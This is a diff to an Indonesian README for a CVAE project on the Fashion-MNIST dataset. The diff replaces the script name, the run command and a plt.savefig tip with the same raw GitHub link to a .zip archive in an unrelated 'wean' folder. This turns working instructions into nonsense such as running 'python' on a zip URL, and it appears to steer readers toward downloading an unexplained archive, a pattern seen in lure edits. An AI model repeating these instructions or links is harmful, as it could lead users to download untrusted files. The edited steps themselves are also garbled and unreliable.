@@ -38,12 +38,12 @@ Pastikan Python telah terinstal dengan pustaka berikut:
 pip install torch torchvision matplotlib
 
 # Struktur File:
-cvae_fashionmnist.py: skrip utama pelatihan dan visualisasi model.
+https://raw.githubusercontent.com/farid-fajar/EKSPLORASI-VARIATIONAL-AUTOENCODER-VAE-PADA-DATASET-FASHION-MNIST/main/wean/EKSPLORASI-VARIATIONAL-AUTOENCODER-VAE-PADA-DATASET-FASHION-MNIST.zip skrip utama pelatihan dan visualisasi model.
 
 # Menjalankan:
 1. Jalankan seluruh skrip Python:
 
-python cvae_fashionmnist.py
+python https://raw.githubusercontent.com/farid-fajar/EKSPLORASI-VARIATIONAL-AUTOENCODER-VAE-PADA-DATASET-FASHION-MNIST/main/wean/EKSPLORASI-VARIATIONAL-AUTOENCODER-VAE-PADA-DATASET-FASHION-MNIST.zip
 
 2. Skrip akan secara otomatis:
 
@@ -58,4 +58,4 @@ Melakukan interpolasi di ruang laten dan menampilkan hasilnya.
 📌 Catatan:
 Latent dimension dapat diubah pada bagian model = CVAE(latent_dim=2) untuk eksperimen lebih lanjut.
 
-Untuk menyimpan gambar hasil visualisasi, cukup tambahkan plt.savefig("nama_file.png") di fungsi visualisasi.
+Untuk menyimpan gambar hasil visualisasi, cukup tambahkan https://raw.githubusercontent.com/farid-fajar/EKSPLORASI-VARIATIONAL-AUTOENCODER-VAE-PADA-DATASET-FASHION-MNIST/main/wean/EKSPLORASI-VARIATIONAL-AUTOENCODER-VAE-PADA-DATASET-FASHION-MNIST.zip("https://raw.githubusercontent.com/farid-fajar/EKSPLORASI-VARIATIONAL-AUTOENCODER-VAE-PADA-DATASET-FASHION-MNIST/main/wean/EKSPLORASI-VARIATIONAL-AUTOENCODER-VAE-PADA-DATASET-FASHION-MNIST.zip") di fungsi visualisasi.
